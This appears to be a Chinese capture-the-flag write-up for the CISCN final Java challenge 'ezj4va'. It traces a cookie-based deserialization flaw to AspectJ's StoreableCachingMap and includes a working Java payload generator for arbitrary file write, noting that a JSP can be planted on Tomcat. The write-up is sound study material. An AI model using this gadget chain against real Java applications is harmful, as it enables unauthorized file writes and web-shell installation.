### 前言

这次 国赛决赛 有道 java 题感觉还不错，个人认为很适合初学反序列化的人

题目文件上传在了 github 上 ：

<https://github.com/liey1/timu/blob/main/ciscn%20ezj4va.zip>

### 项目运行

首先，直接把项目拖进idea是无法运行的，比较简单的方法是，拖进去后：

`右键项目文件夹` -&gt; `Add Framework Support` -&gt; `选中 Web Application`

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c247ca8be98f13e1851749489b1343bf50e6cd7d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c247ca8be98f13e1851749489b1343bf50e6cd7d.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-220a9381a0c6b316b44fed257948beb94e11faae.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-220a9381a0c6b316b44fed257948beb94e11faae.png)

完成后添加一下 `Tomcat Server` 修改一下 `Application Context` 即可。

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0739dbe7d902b8f074cf9fee01c3333c3249899f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0739dbe7d902b8f074cf9fee01c3333c3249899f.png)

启动项目，即可正常访问了

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d9996f74e2937a8704979f8ac5959efd29891a71.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d9996f74e2937a8704979f8ac5959efd29891a71.png)

### 漏洞分析

通过阅读文件很容易发现漏洞点在 `Deserializer` ：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-964d06994e8c0f7390dcccf9c7160c08ee715b03.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-964d06994e8c0f7390dcccf9c7160c08ee715b03.png)

查看`pom`的依赖会发现没有常用的反序列化链可用。

但是此处有 `aspectj`，这里学习了一下这篇文章的`知识点4`

<https://www.cnblogs.com/sijidou/p/14631154.html>

`yso`也加入了这个链，不过需要配合 `CC`：

<https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/AspectJWeaver.java>

可以知道漏洞点 `SimpleCache`下的`StoreableCachingMap` 的 put 函数，我们只需要找到一个调用`put`函数，并且可以控制参数的地方。

找到 `CartServiceImpl`的 `addToCart`函数：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7a464a472b775e2e95df91263f7224868f2c053d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7a464a472b775e2e95df91263f7224868f2c053d.png)

这里的 `skuPrice` 是 `cart` 的 `skuPrice`，`cart`是这道题自定义的一个类，并且是可被序列化的

36行的 `cart`是 `oldCartStr` 进行了反序列化，找到调用这个函数的地方，

找到在 `CartController`下的 `add` 函数，根据路由发现，可以通过 `/cart/add`直接访问

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c0cac5899f7b290468b950c43e66377d089ab62d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c0cac5899f7b290468b950c43e66377d089ab62d.png)

这里的 `skus` 通过参数传递，然后 `oldCart`是 `cookie`中的 `cart`。

再回到 `addToCart`:

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6e95d0fd84da17358b056c8514d23c9696d21c77.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6e95d0fd84da17358b056c8514d23c9696d21c77.png)  
这里 `put`调用 `put` 时的 `键` 和 `值` 是通过第一个参数反序列化后，获取了 `skuDescribe`，然后调用了 `entrySet`，第一次参数也是可控的，所以可以把 `skuPrice` 设置成 `HashMap`即可。

这样 `put` 的参数也可控了，我们可以写一个 `TestController` 测试一下：

```java
package ciscn.fina1.ezj4va.controller;

import ciscn.fina1.ezj4va.domain.Cart;
import ciscn.fina1.ezj4va.utils.Serializer;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

@WebServlet(urlPatterns = ("/test"))
public class TestController extends HttpServlet {

    protected String getSkus() {
        try {
            Cart cart = new Cart();
            Field sku_f = cart.getClass().getDeclaredField("skuDescribe");
            sku_f.setAccessible(true);
            HashMap hashMap = new HashMap<>();
            String values = "abc";
            hashMap.put("test", values.getBytes());
            sku_f.set(cart, hashMap);
            return Serializer.serialize(cart);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    protected String getOldCart() {
        try {
            Cart cart = new Cart();
            Field sku_f = cart.getClass().getDeclaredField("skuDescribe");
            sku_f.setAccessible(true);
            Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
            Constructor constructor = clazz.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            Object o = constructor.newInstance("C:/test/", 1);
            sku_f.set(cart, o);
            return Serializer.serialize(cart);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String payload = "";

        resp.getWriter().println("oldStr:"+getOldCart());
        resp.getWriter().println();
        resp.getWriter().println();
        resp.getWriter().println("skus:" + getSkus());

    }
}

```

`oldStr` 传给 `Cookie` 的 `cart`，`skus`传给 `post`，`skus`需要 `url` 编码一下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-49e9d072a05101c25725012db9509cbc65177b27.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-49e9d072a05101c25725012db9509cbc65177b27.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ec5fb3bc50d9ed5e82501286725b3dededd5f33e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ec5fb3bc50d9ed5e82501286725b3dededd5f33e.png)  
写入成功。

这道题是 `Tomcat` 环境，直接写入 `jsp` 即可。

`payload` 中这里用的是题目已经帮我们写好的序列化方法。

这里有几个小细节，就是 `put` 方法中:

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-cc0eb16e8b877677e849cc4bf31b82cf63330481.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-cc0eb16e8b877677e849cc4bf31b82cf63330481.png)

此处的 `value` 强转成了 `byte[]`，所以我们也需要转换成 byte 数组。

然后 `writeToPath`中：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d3a59e7cab9721475176eb9c2457bd0888f41d4f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d3a59e7cab9721475176eb9c2457bd0888f41d4f.png)  
`this.folder`为初始化时传入的路径：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-062c8b75f2fde974f7915714978e4ee305d0f4b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-062c8b75f2fde974f7915714978e4ee305d0f4b0.png)

至此漏洞利用就完成了。

### 总结

这道题不像 CC 链那样一大串，这其实就是反序列化然后直接调用了 `SimpleCache`.`StoreableCachingMap` 下的 `put` 方法，主要依赖的还是这道题自带的 `addToCart` 函数造成任意文件写入